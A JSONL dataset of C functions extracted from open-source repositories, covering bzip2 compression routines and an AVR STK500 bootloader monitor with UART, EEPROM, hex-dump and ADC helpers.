{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "void BZ_API(BZ2_bzWriteClose)\n                  ( int*          bzerror, \n                    BZFILE*       b, \n                    int           abandon,\n                    unsigned int* nbytes_in,\n                    unsigned int* nbytes_out )", "code": "{\n   BZ2_bzWriteClose64 ( bzerror, b, abandon, \n                        nbytes_in, NULL, nbytes_out, NULL );\n}", "path": "jni\\bzlib.c", "repo_name": "dodola/AndroidPatcher", "stars": 36, "license": "None", "language": "c", "size": 867}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "void BZ_API(BZ2_bzReadClose) ( int *bzerror, BZFILE *b )", "code": "{\n   bzFile* bzf = (bzFile*)b;\n\n   BZ_SETERR(BZ_OK);\n   if (bzf == NULL)\n      { BZ_SETERR(BZ_OK); return; };\n\n   if (bzf->writing)\n      { BZ_SETERR(BZ_SEQUENCE_ERROR); return; };\n\n   if (bzf->initialisedOk)\n      (void)BZ2_bzDecompressEnd ( &(bzf->strm) );\n   free ( bzf );\n}", "path": "jni\\bzlib.c", "repo_name": "dodola/AndroidPatcher", "stars": 36, "license": "None", "language": "c", "size": 867}
{"docstring": "// !!! END CHANGE !!!\n", "func_signal": "int BZ_API(BZ2_bzCompressInit)\n                    ( bz_stream* strm, \n                     int        blockSize100k,\n                     int        verbosity,\n                     int        workFactor )", "code": "{\n   Int32   n;\n   EState* s;\n\n   if (!bz_config_ok()) return BZ_CONFIG_ERROR;\n\n   if (strm == NULL || \n       blockSize100k < 1 || blockSize100k > 9 ||\n       workFactor < 0 || workFactor > 250)\n     return BZ_PARAM_ERROR;\n\n   if (workFactor == 0) workFactor = 30;\n   if (strm->bzalloc == NULL) strm->bzalloc = default_bzalloc;\n   if (strm->bzfree == NULL) strm->bzfree = default_bzfree;\n\n   s = BZALLOC( sizeof(EState) );\n   if (s == NULL) return BZ_MEM_ERROR;\n   s->strm = strm;\n\n   s->arr1 = NULL;\n   s->arr2 = NULL;\n   s->ftab = NULL;\n\n   n       = 100000 * blockSize100k;\n   s->arr1 = BZALLOC( n                  * sizeof(UInt32) );\n   s->arr2 = BZALLOC( (n+BZ_N_OVERSHOOT) * sizeof(UInt32) );\n   s->ftab = BZALLOC( 65537              * sizeof(UInt32) );\n\n   if (s->arr1 == NULL || s->arr2 == NULL || s->ftab == NULL) {\n      if (s->arr1 != NULL) BZFREE(s->arr1);\n      if (s->arr2 != NULL) BZFREE(s->arr2);\n      if (s->ftab != NULL) BZFREE(s->ftab);\n      if (s       != NULL) BZFREE(s);\n      return BZ_MEM_ERROR;\n   }\n\n   s->blockNo           = 0;\n   s->state             = BZ_S_INPUT;\n   s->mode              = BZ_M_RUNNING;\n   s->combinedCRC       = 0;\n   s->blockSize100k     = blockSize100k;\n   s->nblockMAX         = 100000 * blockSize100k - 19;\n   s->verbosity         = verbosity;\n   s->workFactor        = workFactor;\n\n   s->block             = (UChar*)s->arr2;\n   s->mtfv              = (UInt16*)s->arr1;\n   s->zbits             = NULL;\n   s->ptr               = (UInt32*)s->arr1;\n\n   strm->state          = s;\n   strm->total_in_lo32  = 0;\n   strm->total_in_hi32  = 0;\n   strm->total_out_lo32 = 0;\n   strm->total_out_hi32 = 0;\n   init_RL ( s );\n   prepare_new_block ( s );\n   return BZ_OK;\n}", "path": "jni\\bzlib.c", "repo_name": "dodola/AndroidPatcher", "stars": 36, "license": "None", "language": "c", "size": 867}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "static\nvoid init_RL ( EState* s )", "code": "{\n   s->state_in_ch  = 256;\n   s->state_in_len = 0;\n}", "path": "jni\\bzlib.c", "repo_name": "dodola/AndroidPatcher", "stars": 36, "license": "None", "language": "c", "size": 867}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "__inline__ Int32 BZ2_indexIntoF ( Int32 indx, Int32 *cftab )", "code": "{\n   Int32 nb, na, mid;\n   nb = 0;\n   na = 256;\n   do {\n      mid = (nb + na) >> 1;\n      if (indx >= cftab[mid]) nb = mid; else na = mid;\n   }\n   while (na - nb != 1);\n   return nb;\n}", "path": "jni\\bzlib.c", "repo_name": "dodola/AndroidPatcher", "stars": 36, "license": "None", "language": "c", "size": 867}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "int BZ_API(BZ2_bzwrite) (BZFILE* b, void* buf, int len )", "code": "{\n   int bzerr;\n\n   BZ2_bzWrite(&bzerr,b,buf,len);\n   if(bzerr == BZ_OK){\n      return len;\n   }else{\n      return -1;\n   }\n}", "path": "jni\\bzlib.c", "repo_name": "dodola/AndroidPatcher", "stars": 36, "license": "None", "language": "c", "size": 867}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "static\nvoid flush_RL ( EState* s )", "code": "{\n   if (s->state_in_ch < 256) add_pair_to_block ( s );\n   init_RL ( s );\n}", "path": "jni\\bzlib.c", "repo_name": "dodola/AndroidPatcher", "stars": 36, "license": "None", "language": "c", "size": 867}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "static\nBool handle_compress ( bz_stream* strm )", "code": "{\n   Bool progress_in  = False;\n   Bool progress_out = False;\n   EState* s = strm->state;\n   \n   while (True) {\n\n      if (s->state == BZ_S_OUTPUT) {\n         progress_out |= copy_output_until_stop ( s );\n         if (s->state_out_pos < s->numZ) break;\n         if (s->mode == BZ_M_FINISHING && \n             s->avail_in_expect == 0 &&\n             isempty_RL(s)) break;\n         prepare_new_block ( s );\n         s->state = BZ_S_INPUT;\n         if (s->mode == BZ_M_FLUSHING && \n             s->avail_in_expect == 0 &&\n             isempty_RL(s)) break;\n      }\n\n      if (s->state == BZ_S_INPUT) {\n         progress_in |= copy_input_until_stop ( s );\n         if (s->mode != BZ_M_RUNNING && s->avail_in_expect == 0) {\n            flush_RL ( s );\n            BZ2_compressBlock ( s, (Bool)(s->mode == BZ_M_FINISHING) );\n            s->state = BZ_S_OUTPUT;\n         }\n         else\n         if (s->nblock >= s->nblockMAX) {\n            BZ2_compressBlock ( s, False );\n            s->state = BZ_S_OUTPUT;\n         }\n         else\n         if (s->strm->avail_in == 0) {\n            break;\n         }\n      }\n\n   }\n\n   return progress_in || progress_out;\n}", "path": "jni\\bzlib.c", "repo_name": "dodola/AndroidPatcher", "stars": 36, "license": "None", "language": "c", "size": 867}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "static\nvoid* default_bzalloc ( void* opaque, Int32 items, Int32 size )", "code": "{\n   void* v = malloc ( items * size );\n   return v;\n}", "path": "jni\\bzlib.c", "repo_name": "dodola/AndroidPatcher", "stars": 36, "license": "None", "language": "c", "size": 867}
{"docstring": "/*---------------------------------------------------*/\n", "func_signal": "int BZ_API(BZ2_bzDecompressEnd)  ( bz_stream *strm )", "code": "{\n   DState* s;\n   if (strm == NULL) return BZ_PARAM_ERROR;\n   s = strm->state;\n   if (s == NULL) return BZ_PARAM_ERROR;\n   if (s->strm != strm) return BZ_PARAM_ERROR;\n\n   if (s->tt   != NULL) BZFREE(s->tt);\n   if (s->ll16 != NULL) BZFREE(s->ll16);\n   if (s->ll4  != NULL) BZFREE(s->ll4);\n\n   BZFREE(strm->state);\n   strm->state = NULL;\n\n   return BZ_OK;\n}", "path": "jni\\bzlib.c", "repo_name": "dodola/AndroidPatcher", "stars": 36, "license": "None", "language": "c", "size": 867}
{"docstring": "/*---------------------------------------------------*/\n/* Return  True iff data corruption is discovered.\n   Returns False if there is no problem.\n*/\n", "func_signal": "static\nBool unRLE_obuf_to_output_SMALL ( DState* s )", "code": "{\n   UChar k1;\n\n   if (s->blockRandomised) {\n\n      while (True) {\n         /* try to finish existing run */\n         while (True) {\n            if (s->strm->avail_out == 0) return False;\n            if (s->state_out_len == 0) break;\n            *( (UChar*)(s->strm->next_out) ) = s->state_out_ch;\n            BZ_UPDATE_CRC ( s->calculatedBlockCRC, s->state_out_ch );\n            s->state_out_len--;\n            s->strm->next_out++;\n            s->strm->avail_out--;\n            s->strm->total_out_lo32++;\n            if (s->strm->total_out_lo32 == 0) s->strm->total_out_hi32++;\n         }\n   \n         /* can a new run be started? */\n         if (s->nblock_used == s->save_nblock+1) return False;\n\n         /* Only caused by corrupt data stream? */\n         if (s->nblock_used > s->save_nblock+1)\n            return True;\n   \n         s->state_out_len = 1;\n         s->state_out_ch = s->k0;\n         BZ_GET_SMALL(k1); BZ_RAND_UPD_MASK; \n         k1 ^= BZ_RAND_MASK; s->nblock_used++;\n         if (s->nblock_used == s->save_nblock+1) continue;\n         if (k1 != s->k0) { s->k0 = k1; continue; };\n   \n         s->state_out_len = 2;\n         BZ_GET_SMALL(k1); BZ_RAND_UPD_MASK; \n         k1 ^= BZ_RAND_MASK; s->nblock_used++;\n         if (s->nblock_used == s->save_nblock+1) continue;\n         if (k1 != s->k0) { s->k0 = k1; continue; };\n   \n         s->state_out_len = 3;\n         BZ_GET_SMALL(k1); BZ_RAND_UPD_MASK; \n         k1 ^= BZ_RAND_MASK; s->nblock_used++;\n         if (s->nblock_used == s->save_nblock+1) continue;\n         if (k1 != s->k0) { s->k0 = k1; continue; };\n   \n         BZ_GET_SMALL(k1); BZ_RAND_UPD_MASK; \n         k1 ^= BZ_RAND_MASK; s->nblock_used++;\n         s->state_out_len = ((Int32)k1) + 4;\n         BZ_GET_SMALL(s->k0); BZ_RAND_UPD_MASK; \n         s->k0 ^= BZ_RAND_MASK; s->nblock_used++;\n      }\n\n   } else {\n\n      while (True) {\n         /* try to finish existing run */\n         while (True) {\n            if (s->strm->avail_out == 0) return False;\n            if (s->state_out_len == 0) break;\n            *( (UChar*)(s->strm->next_out) ) = s->state_out_ch;\n            BZ_UPDATE_CRC ( s->calculatedBlockCRC, s->state_out_ch );\n            s->state_out_len--;\n            s->strm->next_out++;\n            s->strm->avail_out--;\n            s->strm->total_out_lo32++;\n            if (s->strm->total_out_lo32 == 0) s->strm->total_out_hi32++;\n         }\n   \n         /* can a new run be started? */\n         if (s->nblock_used == s->save_nblock+1) return False;\n\n         /* Only caused by corrupt data stream? */\n         if (s->nblock_used > s->save_nblock+1)\n            return True;\n   \n         s->state_out_len = 1;\n         s->state_out_ch = s->k0;\n         BZ_GET_SMALL(k1); s->nblock_used++;\n         if (s->nblock_used == s->save_nblock+1) continue;\n         if (k1 != s->k0) { s->k0 = k1; continue; };\n   \n         s->state_out_len = 2;\n         BZ_GET_SMALL(k1); s->nblock_used++;\n         if (s->nblock_used == s->save_nblock+1) continue;\n         if (k1 != s->k0) { s->k0 = k1; continue; };\n   \n         s->state_out_len = 3;\n         BZ_GET_SMALL(k1); s->nblock_used++;\n         if (s->nblock_used == s->save_nblock+1) continue;\n         if (k1 != s->k0) { s->k0 = k1; continue; };\n   \n         BZ_GET_SMALL(k1); s->nblock_used++;\n         s->state_out_len = ((Int32)k1) + 4;\n         BZ_GET_SMALL(s->k0); s->nblock_used++;\n      }\n\n   }\n}", "path": "jni\\bzlib.c", "repo_name": "dodola/AndroidPatcher", "stars": 36, "license": "None", "language": "c", "size": 867}
{"docstring": "//************************************************************************\n", "func_signal": "void\tPrintString(char *textString)", "code": "{\nchar\ttheChar;\nint\t\tii;\n\n\ttheChar\t\t=\t1;\n\tii\t\t\t=\t0;\n\twhile (theChar != 0)\n\t{\n\t\ttheChar\t=\ttextString[ii];\n\t\tif (theChar != 0)\n\t\t{\n\t\t\tsendchar(theChar);\n\t\t}\n\t\tii++;\n\t}\n}", "path": "Tools\\APM2_2560_bootloader\\stk500boot.c", "repo_name": "arktools/ardupilotone", "stars": 61, "license": "gpl-3.0", "language": "c", "size": 304066}
{"docstring": "//*****************************************************************************\n", "func_signal": "static unsigned char recchar_timeout(void)", "code": "{\nuint32_t count = 0;\n\n\twhile (!(UART_STATUS_REG & (1 << UART_RECEIVE_COMPLETE)))\n\t{\n\t\t// wait for data\n\t\tcount++;\n\t\tif (count > MAX_TIME_COUNT)\n\t\t{\n\t\tunsigned int\tdata;\n\t\t#if (FLASHEND > 0x10000)\n\t\t\tdata\t=\tpgm_read_word_far(0);\t//*\tget the first word of the user program\n\t\t#else\n\t\t\tdata\t=\tpgm_read_word_near(0);\t//*\tget the first word of the user program\n\t\t#endif\n\t\t\tif (data != 0xffff)\t\t\t\t\t//*\tmake sure its valid before jumping to it.\n\t\t\t{\n\t\t\t\tasm volatile(\n\t\t\t\t\t\t\"clr\tr30\t\t\\n\\t\"\n\t\t\t\t\t\t\"clr\tr31\t\t\\n\\t\"\n\t\t\t\t\t\t\"ijmp\t\\n\\t\"\n\t\t\t\t\t\t);\n\t\t\t}\n\t\t\tcount\t=\t0;\n\t\t}\n\t}\n\treturn UART_DATA_REG;\n}", "path": "Tools\\APM2_2560_bootloader\\stk500boot.c", "repo_name": "arktools/ardupilotone", "stars": 61, "license": "gpl-3.0", "language": "c", "size": 304066}
{"docstring": "//************************************************************************\n", "func_signal": "static void\tPrintCPUstats(void)", "code": "{\nunsigned char fuseByte;\n\n\tPrintFromPROGMEMln(gTextMsg_Explorer, 0);\n\n\tPrintFromPROGMEM(gTextMsg_COMPILED_ON, 0);\n\tPrintFromPROGMEMln(gTextMsg_GCC_DATE_STR, 0);\n\n\tPrintFromPROGMEM(gTextMsg_CPU_Type, 0);\n\tPrintFromPROGMEMln(gTextMsg_CPU_Name, 0);\n\n\tPrintFromPROGMEM(gTextMsg_AVR_ARCH, 0);\n\tPrintDecInt(__AVR_ARCH__, 1);\n\tPrintNewLine();\n\n\tPrintFromPROGMEM(gTextMsg_GCC_VERSION, 0);\n\tPrintFromPROGMEMln(gTextMsg_GCC_VERSION_STR, 0);\n\n\t//*\tthese can be found in avr/version.h\n\tPrintFromPROGMEM(gTextMsg_AVR_LIBC, 0);\n\tPrintFromPROGMEMln(gTextMsg_AVR_LIBC_VER_STR, 0);\n\n#if defined(SIGNATURE_0)\n\tPrintFromPROGMEM(gTextMsg_CPU_SIGNATURE, 0);\n\t//*\tthese can be found in avr/iomxxx.h\n\tPrintHexByte(SIGNATURE_0);\n\tPrintHexByte(SIGNATURE_1);\n\tPrintHexByte(SIGNATURE_2);\n\tPrintNewLine();\n#endif\n\n\n#if defined(GET_LOW_FUSE_BITS)\n\t//*\tfuse settings\n\tPrintFromPROGMEM(gTextMsg_FUSE_BYTE_LOW, 0);\n\tfuseByte\t=\tboot_lock_fuse_bits_get(GET_LOW_FUSE_BITS);\n\tPrintHexByte(fuseByte);\n\tPrintNewLine();\n\n\tPrintFromPROGMEM(gTextMsg_FUSE_BYTE_HIGH, 0);\n\tfuseByte\t=\tboot_lock_fuse_bits_get(GET_HIGH_FUSE_BITS);\n\tPrintHexByte(fuseByte);\n\tPrintNewLine();\n\n\tPrintFromPROGMEM(gTextMsg_FUSE_BYTE_EXT, 0);\n\tfuseByte\t=\tboot_lock_fuse_bits_get(GET_EXTENDED_FUSE_BITS);\n\tPrintHexByte(fuseByte);\n\tPrintNewLine();\n\n\tPrintFromPROGMEM(gTextMsg_FUSE_BYTE_LOCK, 0);\n\tfuseByte\t=\tboot_lock_fuse_bits_get(GET_LOCK_BITS);\n\tPrintHexByte(fuseByte);\n\tPrintNewLine();\n\n#endif\n\n}", "path": "Tools\\APM2_2560_bootloader\\stk500boot.c", "repo_name": "arktools/ardupilotone", "stars": 61, "license": "gpl-3.0", "language": "c", "size": 304066}
{"docstring": "//************************************************************************\n//*\treturns amount of extended memory\n", "func_signal": "static void\tEEPROMtest(void)", "code": "{\nint\t\tii;\nchar\ttheChar;\nchar\ttheEEPROMchar;\nint\t\terrorCount;\n\n\tPrintFromPROGMEMln(gTextMsg_WriteToEEprom, 0);\n\tPrintNewLine();\n\tii\t\t\t=\t0;\n#if (FLASHEND > 0x10000)\n\twhile (((theChar = pgm_read_byte_far(gTextMsg_Explorer + ii)) != '*') && (ii < 512))\n#else\n\twhile (((theChar = pgm_read_byte_near(gTextMsg_Explorer + ii)) != '*') && (ii < 512))\n#endif\n\t{\n\t\teeprom_write_byte((uint8_t *)ii, theChar);\n\t\tif (theChar == 0)\n\t\t{\n\t\t\tPrintFromPROGMEM(gTextMsg_SPACE, 0);\n\t\t}\n\t\telse\n\t\t{\n\t\t\tsendchar(theChar);\n\t\t}\n\t\tii++;\n\t}\n\n\t//*\tno go back through and test\n\tPrintNewLine();\n\tPrintNewLine();\n\tPrintFromPROGMEMln(gTextMsg_ReadingEEprom, 0);\n\tPrintNewLine();\n\terrorCount\t=\t0;\n\tii\t\t\t=\t0;\n#if (FLASHEND > 0x10000)\n\twhile (((theChar = pgm_read_byte_far(gTextMsg_Explorer + ii)) != '*') && (ii < 512))\n#else\n\twhile (((theChar = pgm_read_byte_near(gTextMsg_Explorer + ii)) != '*') && (ii < 512))\n#endif\n\t{\n\t\ttheEEPROMchar\t=\teeprom_read_byte((uint8_t *)ii);\n\t\tif (theEEPROMchar == 0)\n\t\t{\n\t\t\tPrintFromPROGMEM(gTextMsg_SPACE, 0);\n\t\t}\n\t\telse\n\t\t{\n\t\t\tsendchar(theEEPROMchar);\n\t\t}\n\t\tif (theEEPROMchar != theChar)\n\t\t{\n\t\t\terrorCount++;\n\t\t}\n\t\tii++;\n\t}\n\tPrintNewLine();\n\tPrintNewLine();\n\tPrintFromPROGMEM(gTextMsg_EEPROMerrorCnt, 0);\n\tPrintDecInt(errorCount, 1);\n\tPrintNewLine();\n\tPrintNewLine();\n\n\tgEepromIndex\t=\t0;\t//*\tset index back to zero for next eeprom dump\n\n}", "path": "Tools\\APM2_2560_bootloader\\stk500boot.c", "repo_name": "arktools/ardupilotone", "stars": 61, "license": "gpl-3.0", "language": "c", "size": 304066}
{"docstring": "//************************************************************************\n", "func_signal": "static void\tDumpHex(unsigned char dumpWhat, unsigned long startAddress, unsigned char numRows)", "code": "{\nunsigned long\tmyAddressPointer;\nuint8_t\t\t\tii;\nunsigned char\ttheValue;\nchar\t\t\tasciiDump[18];\nunsigned char\t*ramPtr;\n\n\n\tramPtr\t\t\t\t=\t0;\n\ttheValue\t\t\t=\t0;\n\tmyAddressPointer\t=\tstartAddress;\n\twhile (numRows > 0)\n\t{\n\t\tif (myAddressPointer > 0x10000)\n\t\t{\n\t\t\tPrintHexByte((myAddressPointer >> 16) & 0x00ff);\n\t\t}\n\t\tPrintHexByte((myAddressPointer >> 8) & 0x00ff);\n\t\tPrintHexByte(myAddressPointer & 0x00ff);\n\t\tsendchar(0x20);\n\t\tsendchar('-');\n\t\tsendchar(0x20);\n\n\t\tasciiDump[0]\t\t=\t0;\n\t\tfor (ii=0; ii<16; ii++)\n\t\t{\n\t\t\tswitch(dumpWhat)\n\t\t\t{\n\t\t\t\tcase kDUMP_FLASH:\n\t\t\t\t#if (FLASHEND > 0x10000)\n\t\t\t\t\ttheValue\t=\tpgm_read_byte_far(myAddressPointer);\n\t\t\t\t#else\n\t\t\t\t\ttheValue\t=\tpgm_read_byte_near(myAddressPointer);\n\t\t\t\t#endif\n\t\t\t\t\tbreak;\n\n\t\t\t\tcase kDUMP_EEPROM:\n\t\t\t\t\ttheValue\t=\teeprom_read_byte((void *)myAddressPointer);\n\t\t\t\t\tbreak;\n\n\t\t\t\tcase kDUMP_RAM:\n\t\t\t\t\ttheValue\t=\tramPtr[myAddressPointer];\n\t\t\t\t\tbreak;\n\n\t\t\t}\n\t\t\tPrintHexByte(theValue);\n\t\t\tsendchar(0x20);\n\t\t\tif ((theValue >= 0x20) && (theValue < 0x7f))\n\t\t\t{\n\t\t\t\tasciiDump[ii % 16]\t=\ttheValue;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tasciiDump[ii % 16]\t=\t'.';\n\t\t\t}\n\n\t\t\tmyAddressPointer++;\n\t\t}\n\t\tasciiDump[16]\t=\t0;\n\t\tPrintString(asciiDump);\n\t\tPrintNewLine();\n\n\t\tnumRows--;\n\t}\n}", "path": "Tools\\APM2_2560_bootloader\\stk500boot.c", "repo_name": "arktools/ardupilotone", "stars": 61, "license": "gpl-3.0", "language": "c", "size": 304066}
{"docstring": "/** This function is called by the library when in device mode, and must be overridden (see library \"USB Descriptors\"\n *  documentation) by the application code so that the address and size of a requested descriptor can be given\n *  to the USB library. When the device receives a Get Descriptor request on the control endpoint, this function\n *  is called so that the descriptor details can be passed back and the appropriate descriptor sent back to the\n *  USB host.\n */\n", "func_signal": "uint16_t CALLBACK_USB_GetDescriptor(const uint16_t wValue,\n                                    const uint8_t wIndex,\n                                    void** const DescriptorAddress)", "code": "{\n\tconst uint8_t  DescriptorType   = (wValue >> 8);\n\tconst uint8_t  DescriptorNumber = (wValue & 0xFF);\n\n\tvoid*    Address = NULL;\n\tuint16_t Size    = NO_DESCRIPTOR;\n\n\tswitch (DescriptorType)\n\t{\n\t\tcase DTYPE_Device: \n\t\t\tAddress = (void*)&DeviceDescriptor;\n\t\t\tSize    = sizeof(USB_Descriptor_Device_t);\n\t\t\tbreak;\n\t\tcase DTYPE_Configuration: \n\t\t\tAddress = (void*)&ConfigurationDescriptor;\n\t\t\tSize    = sizeof(USB_Descriptor_Configuration_t);\n\t\t\tbreak;\n\t\tcase DTYPE_String: \n\t\t\tswitch (DescriptorNumber)\n\t\t\t{\n\t\t\t\tcase 0x00: \n\t\t\t\t\tAddress = (void*)&LanguageString;\n\t\t\t\t\tSize    = pgm_read_byte(&LanguageString.Header.Size);\n\t\t\t\t\tbreak;\n\t\t\t\tcase 0x01: \n\t\t\t\t\tAddress = (void*)&ManufacturerString;\n\t\t\t\t\tSize    = pgm_read_byte(&ManufacturerString.Header.Size);\n\t\t\t\t\tbreak;\n\t\t\t\tcase 0x02: \n\t\t\t\t\tAddress = (void*)&ProductString;\n\t\t\t\t\tSize    = pgm_read_byte(&ProductString.Header.Size);\n\t\t\t\t\tbreak;\n\t\t\t}\n\t\t\t\n\t\t\tbreak;\n\t}\n\t\n\t*DescriptorAddress = Address;\n\treturn Size;\n}", "path": "Tools\\ArduPPM\\ATMega32U2\\Projects\\arduino-usbserial\\Descriptors.c", "repo_name": "arktools/ardupilotone", "stars": 61, "license": "gpl-3.0", "language": "c", "size": 304066}
{"docstring": "//************************************************************************\n", "func_signal": "static void\tRunMonitor(void)", "code": "{\nchar\t\t\tkeepGoing;\nunsigned char\ttheChar;\nint\t\t\t\tii, jj;\n\n\tfor (ii=0; ii<5; ii++)\n\t{\n\t\tfor (jj=0; jj<25; jj++)\n\t\t{\n\t\t\tsendchar('!');\n\t\t}\n\t\tPrintNewLine();\n\t}\n\n\tgRamIndex\t\t\t=\t0;\n\tgFlashIndex\t\t\t=\t0;\n\tgEepromIndex\t\t=\t0;\n\n\tPrintFromPROGMEMln(gTextMsg_Explorer, 0);\n\n\tkeepGoing\t=\t1;\n\twhile (keepGoing)\n\t{\n\t\tPrintFromPROGMEM(gTextMsg_Prompt, 0);\n\t\ttheChar\t=\trecchar();\n\t\tif (theChar >= 0x60)\n\t\t{\n\t\t\ttheChar\t=\ttheChar & 0x5F;\n\t\t}\n\t#if defined( _CEREBOTPLUS_BOARD_ )\n\t\tif (theChar == 0x5F)\n\t\t{\n\t\t\t\n\t\t}\n\t\telse\n\t#endif\n\t\tif (theChar >= 0x20)\n\t\t{\n\t\t\tsendchar(theChar);\n\t\t\tsendchar(0x20);\n\t\t}\n\n\t\tswitch(theChar)\n\t\t{\n\t\t\tcase '0':\n\t\t\t\tPrintFromPROGMEMln(gTextMsg_HELP_MSG_0, 2);\n\t\t\t\tgFlashIndex\t\t=\t0;\n\t\t\t\tgRamIndex\t\t=\t0;\n\t\t\t\tgEepromIndex\t=\t0;\n\t\t\t\tbreak;\n\n\t\t\tcase '?':\n\t\t\t\tPrintFromPROGMEMln(gTextMsg_HELP_MSG_QM, 2);\n\t\t\t\tPrintCPUstats();\n\t\t\t\tbreak;\n\n\t\t\tcase '@':\n\t\t\t\tPrintFromPROGMEMln(gTextMsg_HELP_MSG_AT, 2);\n\t\t\t\tEEPROMtest();\n\t\t\t\tbreak;\n\n\t\t\tcase 'B':\n\t\t\t\tPrintFromPROGMEMln(gTextMsg_HELP_MSG_B, 2);\n\t\t\t\tBlinkLED();\n\t\t\t\tbreak;\n\n\t\t\tcase 'E':\n\t\t\t\tPrintFromPROGMEMln(gTextMsg_HELP_MSG_E, 2);\n\t\t\t\tDumpHex(kDUMP_EEPROM, gEepromIndex, 16);\n\t\t\t\tgEepromIndex\t+=\t256;\n\t\t\t\tif (gEepromIndex > E2END)\n\t\t\t\t{\n\t\t\t\t\tgEepromIndex\t=\t0;\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\n\t\t\tcase 'F':\n\t\t\t\tPrintFromPROGMEMln(gTextMsg_HELP_MSG_F, 2);\n\t\t\t\tDumpHex(kDUMP_FLASH, gFlashIndex, 16);\n\t\t\t\tgFlashIndex\t+=\t256;\n\t\t\t\tbreak;\n\n\t\t\tcase 'H':\n\t\t\t\tPrintFromPROGMEMln(gTextMsg_HELP_MSG_H, 2);\n\t\t\t\tPrintHelp();\n\t\t\t\tbreak;\n\n\t\t\tcase 'L':\n\t\t\t\tPrintFromPROGMEMln(gTextMsg_HELP_MSG_L, 2);\n\t\t\t\tListAvailablePorts();\n\t\t\t\tbreak;\n\n\t\t\tcase 'Q':\n\t\t\t\tPrintFromPROGMEMln(gTextMsg_HELP_MSG_Q, 2);\n\t\t\t\tkeepGoing\t=\tfalse;\n\t\t\t\tbreak;\n\n\t\t\tcase 'R':\n\t\t\t\tPrintFromPROGMEMln(gTextMsg_HELP_MSG_R, 2);\n\t\t\t\tDumpHex(kDUMP_RAM, gRamIndex, 16);\n\t\t\t\tgRamIndex\t+=\t256;\n\t\t\t\tbreak;\n\n\t\t\tcase 'V':\n\t\t\t\tPrintFromPROGMEMln(gTextMsg_HELP_MSG_V, 2);\n\t\t\t\tVectorDisplay();\n\t\t\t\tbreak;\n\n\t\t\tcase 'Y':\n\t\t\t\tPrintFromPROGMEMln(gTextMsg_HELP_MSG_Y, 2);\n\t\t\t\tAVR_PortOutput();\n\t\t\t\tbreak;\n\t\t\t\n\t\t#if defined( _CEREBOTPLUS_BOARD_ )\n\t\t\tcase 0x5F:\n\t\t\t\t//*\tdo nothing\n\t\t\t\tbreak;\n\t \t#endif\n\t \t\n\t\t\tdefault:\n\t\t\t\tPrintFromPROGMEMln(gTextMsg_HUH, 0);\n\t\t\t\tbreak;\n\t\t}\n\t}\n}", "path": "Tools\\APM2_2560_bootloader\\stk500boot.c", "repo_name": "arktools/ardupilotone", "stars": 61, "license": "gpl-3.0", "language": "c", "size": 304066}
{"docstring": "//************************************************************************\n", "func_signal": "void\tPrintHexByte(unsigned char theByte)", "code": "{\nchar\ttheChar;\n\n\ttheChar\t=\t0x30 + ((theByte >> 4) & 0x0f);\n\tif (theChar > 0x39)\n\t{\n\t\ttheChar\t+=\t7;\n\t}\n\tsendchar(theChar );\n\n\ttheChar\t=\t0x30 + (theByte & 0x0f);\n\tif (theChar > 0x39)\n\t{\n\t\ttheChar\t+=\t7;\n\t}\n\tsendchar(theChar );\n}", "path": "Tools\\APM2_2560_bootloader\\stk500boot.c", "repo_name": "arktools/ardupilotone", "stars": 61, "license": "gpl-3.0", "language": "c", "size": 304066}
{"docstring": "//************************************************************************\n", "func_signal": "int analogRead(uint8_t pin)", "code": "{\nuint8_t low, high;\n\n\t// set the analog reference (high two bits of ADMUX) and select the\n\t// channel (low 4 bits).  this also sets ADLAR (left-adjust result)\n\t// to 0 (the default).\n//\tADMUX\t=\t(analog_reference << 6) | (pin & 0x07);\n\tADMUX\t=\t(1 << 6) | (pin & 0x07);\n\n#if defined(__AVR_ATmega1280__) || defined(__AVR_ATmega2560__)\n\t// the MUX5 bit of ADCSRB selects whether we're reading from channels\n\t// 0 to 7 (MUX5 low) or 8 to 15 (MUX5 high).\n\tADCSRB\t=\t(ADCSRB & ~(1 << MUX5)) | (((pin >> 3) & 0x01) << MUX5);\n#endif\n\n\t// without a delay, we seem to read from the wrong channel\n\t//delay(1);\n\n\t// start the conversion\n\tsbi(ADCSRA, ADSC);\n\n\t// ADSC is cleared when the conversion finishes\n\twhile (bit_is_set(ADCSRA, ADSC));\n\n\t// we have to read ADCL first; doing so locks both ADCL\n\t// and ADCH until ADCH is read.  reading ADCL second would\n\t// cause the results of each conversion to be discarded,\n\t// as ADCL and ADCH would be locked when it completed.\n\tlow\t\t=\tADCL;\n\thigh\t=\tADCH;\n\n\t// combine the two bytes\n\treturn (high << 8) | low;\n}", "path": "Tools\\APM2_2560_bootloader\\stk500boot.c", "repo_name": "arktools/ardupilotone", "stars": 61, "license": "gpl-3.0", "language": "c", "size": 304066}
{"docstring": "//*****************************************************************************\n/*\n * send single byte to USART, wait until transmission is completed\n */\n", "func_signal": "static void sendchar(char c)", "code": "{\n\tUART_DATA_REG\t=\tc;\t\t\t\t\t\t\t\t\t\t// prepare transmission\n\twhile (!(UART_STATUS_REG & (1 << UART_TRANSMIT_COMPLETE)));\t// wait until byte sent\n\tUART_STATUS_REG |= (1 << UART_TRANSMIT_COMPLETE);\t\t\t// delete TXCflag\n}", "path": "Tools\\APM2_2560_bootloader\\stk500boot.c", "repo_name": "arktools/ardupilotone", "stars": 61, "license": "gpl-3.0", "language": "c", "size": 304066}
